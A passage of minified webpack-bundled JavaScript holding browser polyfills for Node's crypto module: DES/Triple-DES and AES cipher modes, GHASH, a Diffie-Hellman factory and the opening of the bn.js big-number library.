            if (((suite = suite.toLowerCase()), aesModes[suite])) (keyLen = aesModes[suite].key), (ivLen = aesModes[suite].iv);
            else {
                if (!desModes[suite]) throw new TypeError("invalid suite type");
                (keyLen = 8 * desModes[suite].key), (ivLen = desModes[suite].iv);
            }
            var keys = ebtk(password, !1, keyLen, ivLen);
            return createCipheriv(suite, keys.key, keys.iv);
        }),
            (exports.createCipheriv = exports.Cipheriv = createCipheriv),
            (exports.createDecipher = exports.Decipher = function (suite, password) {
                var keyLen, ivLen;
                if (((suite = suite.toLowerCase()), aesModes[suite])) (keyLen = aesModes[suite].key), (ivLen = aesModes[suite].iv);
                else {
                    if (!desModes[suite]) throw new TypeError("invalid suite type");
                    (keyLen = 8 * desModes[suite].key), (ivLen = desModes[suite].iv);
                }
                var keys = ebtk(password, !1, keyLen, ivLen);
                return createDecipheriv(suite, keys.key, keys.iv);
            }),
            (exports.createDecipheriv = exports.Decipheriv = createDecipheriv),
            (exports.listCiphers = exports.getCiphers = function () {
                return Object.keys(desModes).concat(aes.getCiphers());
            });
    },
    function (module, exports, __webpack_require__) {
        var CipherBase = __webpack_require__(17),
            des = __webpack_require__(220),
            inherits = __webpack_require__(3),
            Buffer = __webpack_require__(5).Buffer,
            modes = { "des-ede3-cbc": des.CBC.instantiate(des.EDE), "des-ede3": des.EDE, "des-ede-cbc": des.CBC.instantiate(des.EDE), "des-ede": des.EDE, "des-cbc": des.CBC.instantiate(des.DES), "des-ecb": des.DES };
        function DES(opts) {
            CipherBase.call(this);
            var type,
                modeName = opts.mode.toLowerCase(),
                mode = modes[modeName];
            type = opts.decrypt ? "decrypt" : "encrypt";
            var key = opts.key;
            Buffer.isBuffer(key) || (key = Buffer.from(key)), ("des-ede" !== modeName && "des-ede-cbc" !== modeName) || (key = Buffer.concat([key, key.slice(0, 8)]));
            var iv = opts.iv;
            Buffer.isBuffer(iv) || (iv = Buffer.from(iv)), (this._des = mode.create({ key: key, iv: iv, type: type }));
        }
        (modes.des = modes["des-cbc"]),
            (modes.des3 = modes["des-ede3-cbc"]),
            (module.exports = DES),
            inherits(DES, CipherBase),
            (DES.prototype._update = function (data) {
                return Buffer.from(this._des.update(data));
            }),
            (DES.prototype._final = function () {
                return Buffer.from(this._des.final());
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (exports.utils = __webpack_require__(103)), (exports.Cipher = __webpack_require__(51)), (exports.DES = __webpack_require__(104)), (exports.CBC = __webpack_require__(221)), (exports.EDE = __webpack_require__(222));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var assert = __webpack_require__(11),
            inherits = __webpack_require__(3),
            proto = {};
        function CBCState(iv) {
            assert.equal(iv.length, 8, "Invalid IV length"), (this.iv = new Array(8));
            for (var i = 0; i < this.iv.length; i++) this.iv[i] = iv[i];
        }
        (exports.instantiate = function (Base) {
            function CBC(options) {
                Base.call(this, options), this._cbcInit();
            }
            inherits(CBC, Base);
            for (var keys = Object.keys(proto), i = 0; i < keys.length; i++) {
                var key = keys[i];
                CBC.prototype[key] = proto[key];
            }
            return (
                (CBC.create = function (options) {
                    return new CBC(options);
                }),
                CBC
            );
        }),
            (proto._cbcInit = function () {
                var state = new CBCState(this.options.iv);
                this._cbcState = state;
            }),
            (proto._update = function (inp, inOff, out, outOff) {
                var state = this._cbcState,
                    superProto = this.constructor.super_.prototype,
                    iv = state.iv;
                if ("encrypt" === this.type) {
                    for (var i = 0; i < this.blockSize; i++) iv[i] ^= inp[inOff + i];
                    superProto._update.call(this, iv, 0, out, outOff);
                    for (i = 0; i < this.blockSize; i++) iv[i] = out[outOff + i];
                } else {
                    superProto._update.call(this, inp, inOff, out, outOff);
                    for (i = 0; i < this.blockSize; i++) out[outOff + i] ^= iv[i];
                    for (i = 0; i < this.blockSize; i++) iv[i] = inp[inOff + i];
                }
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var assert = __webpack_require__(11),
            inherits = __webpack_require__(3),
            Cipher = __webpack_require__(51),
            DES = __webpack_require__(104);
        function EDEState(type, key) {
            assert.equal(key.length, 24, "Invalid key length");
            var k1 = key.slice(0, 8),
                k2 = key.slice(8, 16),
                k3 = key.slice(16, 24);
            this.ciphers =
                "encrypt" === type
                    ? [DES.create({ type: "encrypt", key: k1 }), DES.create({ type: "decrypt", key: k2 }), DES.create({ type: "encrypt", key: k3 })]
                    : [DES.create({ type: "decrypt", key: k3 }), DES.create({ type: "encrypt", key: k2 }), DES.create({ type: "decrypt", key: k1 })];
        }
        function EDE(options) {
            Cipher.call(this, options);
            var state = new EDEState(this.type, this.options.key);
            this._edeState = state;
        }
        inherits(EDE, Cipher),
            (module.exports = EDE),
            (EDE.create = function (options) {
                return new EDE(options);
            }),
            (EDE.prototype._update = function (inp, inOff, out, outOff) {
                var state = this._edeState;
                state.ciphers[0]._update(inp, inOff, out, outOff), state.ciphers[1]._update(out, outOff, out, outOff), state.ciphers[2]._update(out, outOff, out, outOff);
            }),
            (EDE.prototype._pad = DES.prototype._pad),
            (EDE.prototype._unpad = DES.prototype._unpad);
    },
    function (module, exports, __webpack_require__) {
        var MODES = __webpack_require__(53),
            AuthCipher = __webpack_require__(108),
            Buffer = __webpack_require__(5).Buffer,
            StreamCipher = __webpack_require__(109),
            Transform = __webpack_require__(17),
            aes = __webpack_require__(39),
            ebtk = __webpack_require__(40);
        function Cipher(mode, key, iv) {
            Transform.call(this), (this._cache = new Splitter()), (this._cipher = new aes.AES(key)), (this._prev = Buffer.from(iv)), (this._mode = mode), (this._autopadding = !0);
        }
        __webpack_require__(3)(Cipher, Transform),
            (Cipher.prototype._update = function (data) {
                var chunk, thing;
                this._cache.add(data);
                for (var out = []; (chunk = this._cache.get()); ) (thing = this._mode.encrypt(this, chunk)), out.push(thing);
                return Buffer.concat(out);
            });
        var PADDING = Buffer.alloc(16, 16);
        function Splitter() {
            this.cache = Buffer.allocUnsafe(0);
        }
        function createCipheriv(suite, password, iv) {
            var config = MODES[suite.toLowerCase()];
            if (!config) throw new TypeError("invalid suite type");
            if (("string" == typeof password && (password = Buffer.from(password)), password.length !== config.key / 8)) throw new TypeError("invalid key length " + password.length);
            if (("string" == typeof iv && (iv = Buffer.from(iv)), "GCM" !== config.mode && iv.length !== config.iv)) throw new TypeError("invalid iv length " + iv.length);
            return "stream" === config.type ? new StreamCipher(config.module, password, iv) : "auth" === config.type ? new AuthCipher(config.module, password, iv) : new Cipher(config.module, password, iv);
        }
        (Cipher.prototype._final = function () {
            var chunk = this._cache.flush();
            if (this._autopadding) return (chunk = this._mode.encrypt(this, chunk)), this._cipher.scrub(), chunk;
            if (!chunk.equals(PADDING)) throw (this._cipher.scrub(), new Error("data not multiple of block length"));
        }),
            (Cipher.prototype.setAutoPadding = function (setTo) {
                return (this._autopadding = !!setTo), this;
            }),
            (Splitter.prototype.add = function (data) {
                this.cache = Buffer.concat([this.cache, data]);
            }),
            (Splitter.prototype.get = function () {
                if (this.cache.length > 15) {
                    var out = this.cache.slice(0, 16);
                    return (this.cache = this.cache.slice(16)), out;
                }
                return null;
            }),
            (Splitter.prototype.flush = function () {
                for (var len = 16 - this.cache.length, padBuff = Buffer.allocUnsafe(len), i = -1; ++i < len; ) padBuff.writeUInt8(len, i);
                return Buffer.concat([this.cache, padBuff]);
            }),
            (exports.createCipheriv = createCipheriv),
            (exports.createCipher = function (suite, password) {
                var config = MODES[suite.toLowerCase()];
                if (!config) throw new TypeError("invalid suite type");
                var keys = ebtk(password, !1, config.key, config.iv);
                return createCipheriv(suite, keys.key, keys.iv);
            });
    },
    function (module, exports) {
        (exports.encrypt = function (self, block) {
            return self._cipher.encryptBlock(block);
        }),
            (exports.decrypt = function (self, block) {
                return self._cipher.decryptBlock(block);
            });
    },
    function (module, exports, __webpack_require__) {
        var xor = __webpack_require__(35);
        (exports.encrypt = function (self, block) {
            var data = xor(block, self._prev);
            return (self._prev = self._cipher.encryptBlock(data)), self._prev;
        }),
            (exports.decrypt = function (self, block) {
                var pad = self._prev;
                self._prev = block;
                var out = self._cipher.decryptBlock(block);
                return xor(out, pad);
            });
    },
    function (module, exports, __webpack_require__) {
        var Buffer = __webpack_require__(5).Buffer,
            xor = __webpack_require__(35);
        function encryptStart(self, data, decrypt) {
            var len = data.length,
                out = xor(data, self._cache);
            return (self._cache = self._cache.slice(len)), (self._prev = Buffer.concat([self._prev, decrypt ? data : out])), out;
        }
        exports.encrypt = function (self, data, decrypt) {
            for (var len, out = Buffer.allocUnsafe(0); data.length; ) {
                if ((0 === self._cache.length && ((self._cache = self._cipher.encryptBlock(self._prev)), (self._prev = Buffer.allocUnsafe(0))), !(self._cache.length <= data.length))) {
                    out = Buffer.concat([out, encryptStart(self, data, decrypt)]);
                    break;
                }
                (len = self._cache.length), (out = Buffer.concat([out, encryptStart(self, data.slice(0, len), decrypt)])), (data = data.slice(len));
            }
            return out;
        };
    },
    function (module, exports, __webpack_require__) {
        var Buffer = __webpack_require__(5).Buffer;
        function encryptByte(self, byteParam, decrypt) {
            var out = self._cipher.encryptBlock(self._prev)[0] ^ byteParam;
            return (self._prev = Buffer.concat([self._prev.slice(1), Buffer.from([decrypt ? byteParam : out])])), out;
        }
        exports.encrypt = function (self, chunk, decrypt) {
            for (var len = chunk.length, out = Buffer.allocUnsafe(len), i = -1; ++i < len; ) out[i] = encryptByte(self, chunk[i], decrypt);
            return out;
        };
    },
    function (module, exports, __webpack_require__) {
        var Buffer = __webpack_require__(5).Buffer;
        function encryptByte(self, byteParam, decrypt) {
            for (var bit, value, i = -1, out = 0; ++i < 8; )
                (bit = byteParam & (1 << (7 - i)) ? 128 : 0), (out += (128 & (value = self._cipher.encryptBlock(self._prev)[0] ^ bit)) >> i % 8), (self._prev = shiftIn(self._prev, decrypt ? bit : value));
            return out;
        }
        function shiftIn(buffer, value) {
            var len = buffer.length,
                i = -1,
                out = Buffer.allocUnsafe(buffer.length);
            for (buffer = Buffer.concat([buffer, Buffer.from([value])]); ++i < len; ) out[i] = (buffer[i] << 1) | (buffer[i + 1] >> 7);
            return out;
        }
        exports.encrypt = function (self, chunk, decrypt) {
            for (var len = chunk.length, out = Buffer.allocUnsafe(len), i = -1; ++i < len; ) out[i] = encryptByte(self, chunk[i], decrypt);
            return out;
        };
    },
    function (module, exports, __webpack_require__) {
        (function (Buffer) {
            var xor = __webpack_require__(35);
            function getBlock(self) {
                return (self._prev = self._cipher.encryptBlock(self._prev)), self._prev;
            }
            exports.encrypt = function (self, chunk) {
                for (; self._cache.length < chunk.length; ) self._cache = Buffer.concat([self._cache, getBlock(self)]);
                var pad = self._cache.slice(0, chunk.length);
                return (self._cache = self._cache.slice(chunk.length)), xor(chunk, pad);
            };
        }.call(this, __webpack_require__(6).Buffer));
    },
    function (module, exports, __webpack_require__) {
        var Buffer = __webpack_require__(5).Buffer,
            ZEROES = Buffer.alloc(16, 0);
        function fromArray(out) {
            var buf = Buffer.allocUnsafe(16);
            return buf.writeUInt32BE(out[0] >>> 0, 0), buf.writeUInt32BE(out[1] >>> 0, 4), buf.writeUInt32BE(out[2] >>> 0, 8), buf.writeUInt32BE(out[3] >>> 0, 12), buf;
        }
        function GHASH(key) {
            (this.h = key), (this.state = Buffer.alloc(16, 0)), (this.cache = Buffer.allocUnsafe(0));
        }
        (GHASH.prototype.ghash = function (block) {
            for (var i = -1; ++i < block.length; ) this.state[i] ^= block[i];
            this._multiply();
        }),
            (GHASH.prototype._multiply = function () {
                for (var buf, j, lsbVi, Vi = [(buf = this.h).readUInt32BE(0), buf.readUInt32BE(4), buf.readUInt32BE(8), buf.readUInt32BE(12)], Zi = [0, 0, 0, 0], i = -1; ++i < 128; ) {
                    for (0 != (this.state[~~(i / 8)] & (1 << (7 - (i % 8)))) && ((Zi[0] ^= Vi[0]), (Zi[1] ^= Vi[1]), (Zi[2] ^= Vi[2]), (Zi[3] ^= Vi[3])), lsbVi = 0 != (1 & Vi[3]), j = 3; j > 0; j--)
                        Vi[j] = (Vi[j] >>> 1) | ((1 & Vi[j - 1]) << 31);
                    (Vi[0] = Vi[0] >>> 1), lsbVi && (Vi[0] = Vi[0] ^ (225 << 24));
                }
                this.state = fromArray(Zi);
            }),
            (GHASH.prototype.update = function (buf) {
                var chunk;
                for (this.cache = Buffer.concat([this.cache, buf]); this.cache.length >= 16; ) (chunk = this.cache.slice(0, 16)), (this.cache = this.cache.slice(16)), this.ghash(chunk);
            }),
            (GHASH.prototype.final = function (abl, bl) {
                return this.cache.length && this.ghash(Buffer.concat([this.cache, ZEROES], 16)), this.ghash(fromArray([0, abl, 0, bl])), this.state;
            }),
            (module.exports = GHASH);
    },
    function (module, exports, __webpack_require__) {
        var AuthCipher = __webpack_require__(108),
            Buffer = __webpack_require__(5).Buffer,
            MODES = __webpack_require__(53),
            StreamCipher = __webpack_require__(109),
            Transform = __webpack_require__(17),
            aes = __webpack_require__(39),
            ebtk = __webpack_require__(40);
        function Decipher(mode, key, iv) {
            Transform.call(this), (this._cache = new Splitter()), (this._last = void 0), (this._cipher = new aes.AES(key)), (this._prev = Buffer.from(iv)), (this._mode = mode), (this._autopadding = !0);
        }
        function Splitter() {
            this.cache = Buffer.allocUnsafe(0);
        }
        function createDecipheriv(suite, password, iv) {
            var config = MODES[suite.toLowerCase()];
            if (!config) throw new TypeError("invalid suite type");
            if (("string" == typeof iv && (iv = Buffer.from(iv)), "GCM" !== config.mode && iv.length !== config.iv)) throw new TypeError("invalid iv length " + iv.length);
            if (("string" == typeof password && (password = Buffer.from(password)), password.length !== config.key / 8)) throw new TypeError("invalid key length " + password.length);
            return "stream" === config.type ? new StreamCipher(config.module, password, iv, !0) : "auth" === config.type ? new AuthCipher(config.module, password, iv, !0) : new Decipher(config.module, password, iv);
        }
        __webpack_require__(3)(Decipher, Transform),
            (Decipher.prototype._update = function (data) {
                var chunk, thing;
                this._cache.add(data);
                for (var out = []; (chunk = this._cache.get(this._autopadding)); ) (thing = this._mode.decrypt(this, chunk)), out.push(thing);
                return Buffer.concat(out);
            }),
            (Decipher.prototype._final = function () {
                var chunk = this._cache.flush();
                if (this._autopadding)
                    return (function (last) {
                        var padded = last[15];
                        if (padded < 1 || padded > 16) throw new Error("unable to decrypt data");
                        var i = -1;
                        for (; ++i < padded; ) if (last[i + (16 - padded)] !== padded) throw new Error("unable to decrypt data");
                        if (16 === padded) return;
                        return last.slice(0, 16 - padded);
                    })(this._mode.decrypt(this, chunk));
                if (chunk) throw new Error("data not multiple of block length");
            }),
            (Decipher.prototype.setAutoPadding = function (setTo) {
                return (this._autopadding = !!setTo), this;
            }),
            (Splitter.prototype.add = function (data) {
                this.cache = Buffer.concat([this.cache, data]);
            }),
            (Splitter.prototype.get = function (autoPadding) {
                var out;
                if (autoPadding) {
                    if (this.cache.length > 16) return (out = this.cache.slice(0, 16)), (this.cache = this.cache.slice(16)), out;
                } else if (this.cache.length >= 16) return (out = this.cache.slice(0, 16)), (this.cache = this.cache.slice(16)), out;
                return null;
            }),
            (Splitter.prototype.flush = function () {
                if (this.cache.length) return this.cache;
            }),
            (exports.createDecipher = function (suite, password) {
                var config = MODES[suite.toLowerCase()];
                if (!config) throw new TypeError("invalid suite type");
                var keys = ebtk(password, !1, config.key, config.iv);
                return createDecipheriv(suite, keys.key, keys.iv);
            }),
            (exports.createDecipheriv = createDecipheriv);
    },
    function (module, exports) {
        (exports["des-ecb"] = { key: 8, iv: 0 }),
            (exports["des-cbc"] = exports.des = { key: 8, iv: 8 }),
            (exports["des-ede3-cbc"] = exports.des3 = { key: 24, iv: 8 }),
            (exports["des-ede3"] = { key: 24, iv: 0 }),
            (exports["des-ede-cbc"] = { key: 16, iv: 8 }),
            (exports["des-ede"] = { key: 16, iv: 0 });
    },
    function (module, exports, __webpack_require__) {
        (function (Buffer) {
            var generatePrime = __webpack_require__(110),
                primes = __webpack_require__(238),
                DH = __webpack_require__(239);
            var ENCODINGS = { binary: !0, hex: !0, base64: !0 };
            (exports.DiffieHellmanGroup = exports.createDiffieHellmanGroup = exports.getDiffieHellman = function (mod) {
                var prime = new Buffer(primes[mod].prime, "hex"),
                    gen = new Buffer(primes[mod].gen, "hex");
                return new DH(prime, gen);
            }),
                (exports.createDiffieHellman = exports.DiffieHellman = function createDiffieHellman(prime, enc, generator, genc) {
                    return Buffer.isBuffer(enc) || void 0 === ENCODINGS[enc]
                        ? createDiffieHellman(prime, "binary", enc, generator)
                        : ((enc = enc || "binary"),
                          (genc = genc || "binary"),
                          (generator = generator || new Buffer([2])),
                          Buffer.isBuffer(generator) || (generator = new Buffer(generator, genc)),
                          "number" == typeof prime ? new DH(generatePrime(prime, generator), generator, !0) : (Buffer.isBuffer(prime) || (prime = new Buffer(prime, enc)), new DH(prime, generator, !0)));
                });
        }.call(this, __webpack_require__(6).Buffer));
    },
    function (module, exports) {},
    function (module, exports, __webpack_require__) {
        (function (module) {
            !(function (module, exports) {
                "use strict";
                function assert(val, msg) {
                    if (!val) throw new Error(msg || "Assertion failed");
                }
                function inherits(ctor, superCtor) {
                    ctor.super_ = superCtor;
                    var TempCtor = function () {};
                    (TempCtor.prototype = superCtor.prototype), (ctor.prototype = new TempCtor()), (ctor.prototype.constructor = ctor);
                }
                function BN(number, base, endian) {
                    if (BN.isBN(number)) return number;
                    (this.negative = 0),
                        (this.words = null),
                        (this.length = 0),
                        (this.red = null),
                        null !== number && (("le" !== base && "be" !== base) || ((endian = base), (base = 10)), this._init(number || 0, base || 10, endian || "be"));
                }
                var Buffer;
                "object" == typeof module ? (module.exports = BN) : (exports.BN = BN), (BN.BN = BN), (BN.wordSize = 26);
                try {
                    Buffer = "undefined" != typeof window && void 0 !== window.Buffer ? window.Buffer : __webpack_require__(236).Buffer;
                } catch (e) {}
                function parseHex4Bits(string, index) {
                    var c = string.charCodeAt(index);
                    return c >= 65 && c <= 70 ? c - 55 : c >= 97 && c <= 102 ? c - 87 : (c - 48) & 15;
                }
                function parseHexByte(string, lowerBound, index) {
                    var r = parseHex4Bits(string, index);
                    return index - 1 >= lowerBound && (r |= parseHex4Bits(string, index - 1) << 4), r;
                }
                function parseBase(str, start, end, mul) {
                    for (var r = 0, len = Math.min(str.length, end), i = start; i < len; i++) {
                        var c = str.charCodeAt(i) - 48;
                        (r *= mul), (r += c >= 49 ? c - 49 + 10 : c >= 17 ? c - 17 + 10 : c);
                    }
                    return r;
                }
                (BN.isBN = function (num) {
                    return num instanceof BN || (null !== num && "object" == typeof num && num.constructor.wordSize === BN.wordSize && Array.isArray(num.words));
                }),
                    (BN.max = function (left, right) {
                        return left.cmp(right) > 0 ? left : right;
                    }),
                    (BN.min = function (left, right) {
                        return left.cmp(right) < 0 ? left : right;
                    }),
                    (BN.prototype._init = function (number, base, endian) {
                        if ("number" == typeof number) return this._initNumber(number, base, endian);
                        if ("object" == typeof number) return this._initArray(number, base, endian);
                        "hex" === base && (base = 16), assert(base === (0 | base) && base >= 2 && base <= 36);
                        var start = 0;
                        "-" === (number = number.toString().replace(/\s+/g, ""))[0] && (start++, (this.negative = 1)),
                            start < number.length && (16 === base ? this._parseHex(number, start, endian) : (this._parseBase(number, base, start), "le" === endian && this._initArray(this.toArray(), base, endian)));
                    }),
                    (BN.prototype._initNumber = function (number, base, endian) {
                        number < 0 && ((this.negative = 1), (number = -number)),
                            number < 67108864
                                ? ((this.words = [67108863 & number]), (this.length = 1))
                                : number < 4503599627370496
                                ? ((this.words = [67108863 & number, (number / 67108864) & 67108863]), (this.length = 2))
                                : (assert(number < 9007199254740992), (this.words = [67108863 & number, (number / 67108864) & 67108863, 1]), (this.length = 3)),
                            "le" === endian && this._initArray(this.toArray(), base, endian);
                    }),
                    (BN.prototype._initArray = function (number, base, endian) {
                        if ((assert("number" == typeof number.length), number.length <= 0)) return (this.words = [0]), (this.length = 1), this;
                        (this.length = Math.ceil(number.length / 3)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var j,
                            w,
                            off = 0;
                        if ("be" === endian)
                            for (i = number.length - 1, j = 0; i >= 0; i -= 3)
                                (w = number[i] | (number[i - 1] << 8) | (number[i - 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        else if ("le" === endian)
                            for (i = 0, j = 0; i < number.length; i += 3)
                                (w = number[i] | (number[i + 1] << 8) | (number[i + 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        return this.strip();
                    }),
                    (BN.prototype._parseHex = function (number, start, endian) {
                        (this.length = Math.ceil((number.length - start) / 6)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var w,
                            off = 0,
                            j = 0;
                        if ("be" === endian)
                            for (i = number.length - 1; i >= start; i -= 2) (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        else
                            for (i = (number.length - start) % 2 == 0 ? start + 1 : start; i < number.length; i += 2)
                                (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        this.strip();
                    }),
                    (BN.prototype._parseBase = function (number, base, start) {
                        (this.words = [0]), (this.length = 1);
                        for (var limbLen = 0, limbPow = 1; limbPow <= 67108863; limbPow *= base) limbLen++;
                        limbLen--, (limbPow = (limbPow / base) | 0);
                        for (var total = number.length - start, mod = total % limbLen, end = Math.min(total, total - mod) + start, word = 0, i = start; i < end; i += limbLen)
                            (word = parseBase(number, i, i + limbLen, base)), this.imuln(limbPow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        if (0 !== mod) {
                            var pow = 1;
                            for (word = parseBase(number, i, number.length, base), i = 0; i < mod; i++) pow *= base;
                            this.imuln(pow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        }
                        this.strip();
                    }),
                    (BN.prototype.copy = function (dest) {
                        dest.words = new Array(this.length);
                        for (var i = 0; i < this.length; i++) dest.words[i] = this.words[i];
                        (dest.length = this.length), (dest.negative = this.negative), (dest.red = this.red);
                    }),
                    (BN.prototype.clone = function () {
                        var r = new BN(null);
                        return this.copy(r), r;
                    }),
                    (BN.prototype._expand = function (size) {
                        for (; this.length < size; ) this.words[this.length++] = 0;
                        return this;
                    }),
                    (BN.prototype.strip = function () {
                        for (; this.length > 1 && 0 === this.words[this.length - 1]; ) this.length--;
                        return this._normSign();
                    }),
                    (BN.prototype._normSign = function () {
                        return 1 === this.length && 0 === this.words[0] && (this.negative = 0), this;
                    }),
                    (BN.prototype.inspect = function () {
                        return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">";
                    });
                var zeros = [
                        "",
                        "0",
                        "00",
                        "000",
                        "0000",
                        "00000",
                        "000000",
                        "0000000",
                        "00000000",
                        "000000000",
                        "0000000000",
                        "00000000000",
                        "000000000000",
                        "0000000000000",
                        "00000000000000",
                        "000000000000000",
                        "0000000000000000",
                        "00000000000000000",
                        "000000000000000000",
                        "0000000000000000000",
                        "00000000000000000000",
                        "000000000000000000000",
                        "0000000000000000000000",
                        "00000000000000000000000",
                        "000000000000000000000000",
                        "0000000000000000000000000",
                    ],
                    groupSizes = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5],
                    groupBases = [
                        0,
                        0,
                        33554432,
                        43046721,
                        16777216,
                        48828125,
                        60466176,
                        40353607,
                        16777216,
                        43046721,
                        1e7,
                        19487171,
                        35831808,
                        62748517,
                        7529536,
                        11390625,
                        16777216,
                        24137569,
                        34012224,
                        47045881,
                        64e6,
                        4084101,
                        5153632,
                        6436343,
                        7962624,
                        9765625,
                        11881376,
                        14348907,
                        17210368,
                        20511149,
                        243e5,
                        28629151,
                        33554432,
                        39135393,
                        45435424,
                        52521875,
                        60466176,
                    ];
                function smallMulTo(self, num, out) {
                    out.negative = num.negative ^ self.negative;
                    var len = (self.length + num.length) | 0;
                    (out.length = len), (len = (len - 1) | 0);
                    var a = 0 | self.words[0],
                        b = 0 | num.words[0],
                        r = a * b,
                        lo = 67108863 & r,
                        carry = (r / 67108864) | 0;
                    out.words[0] = lo;
                    for (var k = 1; k < len; k++) {
                        for (var ncarry = carry >>> 26, rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                            var i = (k - j) | 0;
                            (ncarry += ((r = (a = 0 | self.words[i]) * (b = 0 | num.words[j]) + rword) / 67108864) | 0), (rword = 67108863 & r);
                        }
                        (out.words[k] = 0 | rword), (carry = 0 | ncarry);
                    }
                    return 0 !== carry ? (out.words[k] = 0 | carry) : out.length--, out.strip();
                }
                (BN.prototype.toString = function (base, padding) {
                    var out;
                    if (((padding = 0 | padding || 1), 16 === (base = base || 10) || "hex" === base)) {
                        out = "";
                        for (var off = 0, carry = 0, i = 0; i < this.length; i++) {
                            var w = this.words[i],
                                word = (16777215 & ((w << off) | carry)).toString(16);
                            (out = 0 !== (carry = (w >>> (24 - off)) & 16777215) || i !== this.length - 1 ? zeros[6 - word.length] + word + out : word + out), (off += 2) >= 26 && ((off -= 26), i--);
                        }
                        for (0 !== carry && (out = carry.toString(16) + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    if (base === (0 | base) && base >= 2 && base <= 36) {
                        var groupSize = groupSizes[base],
                            groupBase = groupBases[base];
                        out = "";
                        var c = this.clone();
                        for (c.negative = 0; !c.isZero(); ) {
                            var r = c.modn(groupBase).toString(base);
                            out = (c = c.idivn(groupBase)).isZero() ? r + out : zeros[groupSize - r.length] + r + out;
                        }
                        for (this.isZero() && (out = "0" + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    assert(!1, "Base should be between 2 and 36");
                }),
                    (BN.prototype.toNumber = function () {
                        var ret = this.words[0];
                        return (
                            2 === this.length
                                ? (ret += 67108864 * this.words[1])
                                : 3 === this.length && 1 === this.words[2]
                                ? (ret += 4503599627370496 + 67108864 * this.words[1])
                                : this.length > 2 && assert(!1, "Number can only safely store up to 53 bits"),
                            0 !== this.negative ? -ret : ret
                        );
                    }),
                    (BN.prototype.toJSON = function () {
                        return this.toString(16);
                    }),
                    (BN.prototype.toBuffer = function (endian, length) {
                        return assert(void 0 !== Buffer), this.toArrayLike(Buffer, endian, length);
                    }),
                    (BN.prototype.toArray = function (endian, length) {
                        return this.toArrayLike(Array, endian, length);
                    }),
                    (BN.prototype.toArrayLike = function (ArrayType, endian, length) {
                        var byteLength = this.byteLength(),
                            reqLength = length || Math.max(1, byteLength);
                        assert(byteLength <= reqLength, "byte array longer than desired length"), assert(reqLength > 0, "Requested array length <= 0"), this.strip();
                        var b,
                            i,
                            littleEndian = "le" === endian,
                            res = new ArrayType(reqLength),
                            q = this.clone();
                        if (littleEndian) {
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[i] = b);
                            for (; i < reqLength; i++) res[i] = 0;
                        } else {
                            for (i = 0; i < reqLength - byteLength; i++) res[i] = 0;
                            for (i = 0; !q.isZero(); i++) (b = q.andln(255)), q.iushrn(8), (res[reqLength - i - 1] = b);
                        }
                        return res;
                    }),
                    Math.clz32
                        ? (BN.prototype._countBits = function (w) {
                              return 32 - Math.clz32(w);
                          })
                        : (BN.prototype._countBits = function (w) {
                              var t = w,
                                  r = 0;
                              return t >= 4096 && ((r += 13), (t >>>= 13)), t >= 64 && ((r += 7), (t >>>= 7)), t >= 8 && ((r += 4), (t >>>= 4)), t >= 2 && ((r += 2), (t >>>= 2)), r + t;
                          }),
                    (BN.prototype._zeroBits = function (w) {
                        if (0 === w) return 26;
                        var t = w,
                            r = 0;
                        return 0 == (8191 & t) && ((r += 13), (t >>>= 13)), 0 == (127 & t) && ((r += 7), (t >>>= 7)), 0 == (15 & t) && ((r += 4), (t >>>= 4)), 0 == (3 & t) && ((r += 2), (t >>>= 2)), 0 == (1 & t) && r++, r;
                    }),
                    (BN.prototype.bitLength = function () {
                        var w = this.words[this.length - 1],
                            hi = this._countBits(w);
                        return 26 * (this.length - 1) + hi;
                    }),
                    (BN.prototype.zeroBits = function () {
                        if (this.isZero()) return 0;
                        for (var r = 0, i = 0; i < this.length; i++) {
                            var b = this._zeroBits(this.words[i]);
                            if (((r += b), 26 !== b)) break;
                        }
                        return r;
                    }),
                    (BN.prototype.byteLength = function () {
                        return Math.ceil(this.bitLength() / 8);
                    }),
                    (BN.prototype.toTwos = function (width) {
                        return 0 !== this.negative ? this.abs().inotn(width).iaddn(1) : this.clone();
                    }),
                    (BN.prototype.fromTwos = function (width) {
                        return this.testn(width - 1) ? this.notn(width).iaddn(1).ineg() : this.clone();
                    }),
                    (BN.prototype.isNeg = function () {
                        return 0 !== this.negative;
                    }),
                    (BN.prototype.neg = function () {
                        return this.clone().ineg();
                    }),
                    (BN.prototype.ineg = function () {
                        return this.isZero() || (this.negative ^= 1), this;
                    }),
                    (BN.prototype.iuor = function (num) {
                        for (; this.length < num.length; ) this.words[this.length++] = 0;
                        for (var i = 0; i < num.length; i++) this.words[i] = this.words[i] | num.words[i];
                        return this.strip();
                    }),
                    (BN.prototype.ior = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuor(num);
                    }),
                    (BN.prototype.or = function (num) {
                        return this.length > num.length ? this.clone().ior(num) : num.clone().ior(this);
                    }),
